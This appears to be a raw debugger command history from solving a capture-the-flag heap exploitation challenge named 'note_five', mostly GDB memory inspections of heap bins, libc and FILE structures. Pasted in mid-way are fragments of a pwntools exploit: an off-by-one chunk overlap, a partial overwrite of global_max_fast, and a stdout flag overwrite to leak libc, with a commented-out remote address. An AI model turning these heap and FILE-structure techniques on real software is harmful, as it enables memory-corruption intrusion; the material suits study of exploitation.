vmmap
c
vmmap
x /80gx 0x0000555555757000
vmmap
x /80gx 0x0000555555757000
x /100gx 0x0000555555757000
c
x /100gx 0x0000555555757000
c
x /100gx 0x0000555555757000
c
x /100gx 0x0000555555757000
x /100gx 0x0000555555757000
c
x /100gx 0x0000555555757000
c
x /100gx 0x0000555555757000
x /100gx 0x0000555555757100
c
p main_arena .bins[1]
x /100gx 0x0000555555757100
x /100gx 0x0000555555757000
c
x /100gx 0x0000555555757000
c
x /100gx 0x0000555555757000
p main_arena.bins[1]
delete(2)
c
p main_arena.bins[1]
x /100gx 0x0000555555757000
p main_arena .bins[1]
x /100gx 0x0000555555757000
x /100gx 0x0000555555757100
x /100gx 0x0000555555757000
x /20gx 0x00007ffff7dd1b78
p main_arena .bins[1]
c
p main_arena .bins[1]
x /20gx 0x00007ffff7dd1b78
x /100gx 0x0000555555757000
x /20gx 0x00007ffff7dd1b78
heap
heapinfo
p main_arena
p global_max_fast 
p &global_max_fast 
x /20gx 0x00007ffff7dd1b78
x /100gx 0x0000555555757000
r
r
c
vmmap
x /20gx x555555554000+0x202060
x /20gx 0x555555554000+0x202060
c
x /20gx 0x555555554000+0x202060
x /20gx 0x0000555555757100
c
x /20gx 0x0000555555757100
c
x /20gx 0x555555554000+0x202060
x /80gx 0x0000555555757110
x /80gx 0x0000555555757100
x /20gx 0x555555554000+0x202060
c
x /20gx 0x555555554000+0x202060
x /20gx 0x0000555555757210
p stdio
p stdin
p stderr
p stdout
p global_max_fast 
p &global_max_fast 
x /20gx 0x7ffff7dd37e8
c
x /20gx 0x7ffff7dd37e8
x /80gx 0x7ffff7dd36e8
x /80gx 0x7ffff7dd34e8
x /80gx 0x7ffff7dd35e8
x /80gx 0x7ffff7dd3508
x /80gx 0x7ffff7dd3578
p main_arena .bins[1]
c
p main_arena .bins[1]
x /20gx 0x555555554000+0x202060
x /20gx 0x0000555555757200
x /20gx 0x00007ffff7dd37e8
c
x /20gx 0x00007ffff7dd37e8
x /20gx 0x555555554000+0x202060
x /20gx 0x0000555555757210
x /2gx 0x00007ffff7dd25cf
c
x /2gx 0x00007ffff7dd25cf
x /20gx 0x0000555555757210
p main_arena.bins[1]
x /2gx 0x00007ffff7dd37e8

c
x /20gx 0x555555554000+0x202060
x stdio
p stdout
x /40gx 0x7ffff7dd2620
x /40gx 0x7ffff7dd2610
x /40gx 0x7ffff7dd209
x /40gx 0x7ffff7dd2609
x /40gx 0x7ffff7dd2602
x /40gx 0x7ffff7dd2604
x /40gx 0x7ffff7dd2603
x /40gx 0x7ffff7dd2605
x /40gx 0x7ffff7dd2606
x /40gx 0x7ffff7dd2605
x /40gx 0x7ffff7dd2604
x /40gx 0x7ffff7dd2607
x /40gx 0x7ffff7dd260e
x /40gx 0x7ffff7dd2607
x /40gx 0x7ffff7dd2609
x /40gx 0x7ffff7dd260a
x /40gx stderr
x 0x7ffff7dd25d1
x /2gx 0x7ffff7dd25d1
x /2gx 0x7ffff7dd25bf
x /2gx 0x7ffff7dd25b7
x /2gx 0x7ffff7dd25cf
x /2gx 0x7ffff7dd25cf+0xf0
x /20gx 0x555555554000+0x202060
x /20gx 0x00007ffff7dd25e0
x /20gx 0x555555554000+0x202060
x /20gx 0x00007ffff7dd25df
 x /20gx 0x007ffff7dd26a300
 x /20gx 0x007ffff7dd26a3
p=process('./note_five')
#p=remote("112.126.103.195",9999)
add(0,0xf8)
add(1,0xf8)
add(2,0xe8)
add(3,0xe8)
add(4,0xe8)
add(3,0xe8)
add(4,0xe8)
#overlap
edit(0,"a"*0xf0+p64(0x200)+"\xf1")
delete(1)
# modify global_fast_size
add(1,0xf8)
edit(2,"a"*8+"\xe8\x37"+"\n")
add(1,0xe8)
delete(1)
edit(2,"\xcf\x25\n")
add(1,0xe8)
vmmap
x /20gx 0x0000555555554000+0x202060
c
x /20gx 0x0000555555554000+0x202060
x /20gx 0x00007ffff7dd25df
x /20gx 0x007ffff7dd26a300
x /20gx 0x007ffff7dd26a3
 x /20gx 0x007ffff7dd26a300
 x /20gx 0x007ffff7dd26a3
 x /20gx 0x007ffff7dd2600
c
 x /20gx 0x007ffff7dd2600
p main_arena .bins[1]
vmmap
x /20gx 0x0000555555554000+0x202080
p main_arena.bins[0]
p main_arena.bins[1]
x /20gx 0x00007ffff7dd25df
p main_arena.top 
p &main_arena.top 
c
x /20gx 0x0000555555554000+0x202080
x /20gx 0x0000555555554000+0x202080
p main_arena .bins[1]
p main_arena .bins[1]
x /20gx p=process('./note_five')
#p=remote("112.126.103.195",9999)
add(0,0xf8)
add(1,0xf8)
add(2,0xe8)
add(3,0xe8)
add(4,0xe8)
add(3,0xe8)
add(4,0xe8)
#overlap
edit(0,"a"*0xf0+p64(0x200)+"\xf1")
delete(1)
# modify global_fast_size
add(1,0xf8)
edit(2,"a"*8+"\xe8\x37"+"\n")
add(1,0xe8)
delete(1)
edit(2,"\xcf\x25\n")
add(1,0xe8)
add(0,0xe8)
edit(0,"a"+p64(0)*7+p64(0xf1)+p64(0xfbad1887)+p64(0)*3+"\x00"+"\n")
p.recvuntil("\x7f\x00\x00")
libc=u64(p.recv(8))-0x7ffff7dd26a3+0x7ffff7a0d000
print hex(libc)
delete(1
x /20gx 0x555555757200
c
vmmap
x /20gx 0x0000555555554000+0x202060
p main_arena .bins[1]
x /20gx 0x555555757200
x /20gx 0x00007ffff7dd26af
c
x /20gx 0x00007ffff7dd26af
x /20gx 0x0000555555554000+0x202060
x /20gx 0x00007ffff7dd26bf
x /20gx 0x00007ffff7dd26c0
x /80gx 0x00007ffff7dd26c0
c
x /80gx 0x00007ffff7dd26c0
p system
x /gx 0x00007ffff7dd2540
p vtable
p _IO_
p _IO_list_all
p (struct _IO_FILE_plus *) 0x7ffff7dd2540
p *(struct _IO_FILE_plus *) 0x7ffff7dd2540
x /20gx 0x7ffff7dd06e0
x /20gx stdout
x /90gx stdout
p _IO_FILE  stdout
p _IO_FILE * stdout
p _IO_FILE * 0x7ffff7dd2620
p *(_IO_FILE *)0x7ffff7dd2620
p &((_IO_FILE *)0x7ffff7dd2620)->_mode
p stdin
p stderr
p &((_IO_FILE *)0x7ffff7dd2540)->_mode
p (_IO_FILE *)0x7ffff7dd2540)
p *(_IO_FILE *)0x7ffff7dd2540
p *(_IO_FILE *)0x7ffff7dd2540
p _IO_list_all
x /20gx 0x7ffff7dd2540
p *(_IO_FILE_plus *)0x7ffff7dd2540
p *(struct _IO_FILE_plus *)0x7ffff7dd2540
p ((struct _IO_FILE_plus *)0x7ffff7dd2540)->vtable
p (const struct _IO_jump_t *) 0x7ffff7dd06e0 
p *(const struct _IO_jump_t *) 0x7ffff7dd06e0 
x /20gx 0x7ffff7afe147
p *(const struct _IO_jump_t *)0x7ffff7afe147
stderr
p stderr
r
p &global_max_fast 
r
r
r
x /20gx 0x555555554000+0x202060
x /20gx 0x0000555555757010
